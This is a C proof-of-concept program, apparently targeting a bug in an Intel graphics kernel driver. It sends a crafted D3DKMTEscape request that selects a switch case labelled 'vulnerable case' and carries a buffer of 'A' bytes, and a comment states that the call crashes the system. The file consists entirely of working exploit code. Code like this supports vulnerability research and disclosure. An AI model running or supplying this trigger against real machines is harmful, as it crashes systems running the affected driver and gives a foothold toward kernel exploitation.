#define BUF_SIZE 100

static const char* intel = "Intel";

typedef struct {
	UINT unknown1;
	UINT unknown2;
	UINT escape_jmp_table_index;
	UINT switchcase_index;
	char buffer[BUF_SIZE];
} PrivateDriverData;

int main()
{
	int result = 0;
	DRIVER_INFO driverInfo = { 0 };
	D3DKMT_ESCAPE escapeObj = { 0 };
	PrivateDriverData data = { 0 };
	int status = initDriver(&driverInfo, intel);
	if (!NT_SUCCESS(status)) {
		printf("Could not initialize connection to driver");
		return -1;
	}
	printf("[+] Initialized driver\n");
	escapeObj.Type = D3DKMT_ESCAPE_DRIVERPRIVATE;
	escapeObj.hAdapter = driverInfo.hAdapter;
	escapeObj.hDevice = (D3DKMT_HANDLE)NULL;
	data.unknown1 = 'AAAA';
	data.unknown2 = 'BBBB';
	data.escape_jmp_table_index = 1;
	data.switchcase_index = 205; // vulnerable case
	memset(data.buffer, 'A', BUF_SIZE);

	escapeObj.pPrivateDriverData = (void*)&data;
	escapeObj.PrivateDriverDataSize = sizeof(data);
	status = D3DKMTEscape(&escapeObj); // Will not return, it will crash the system.
	if (!NT_SUCCESS(status)) {
		printf("[-] D3DKMTEscape failed (%x)", status);
	}
	getchar();
	return 0;
}
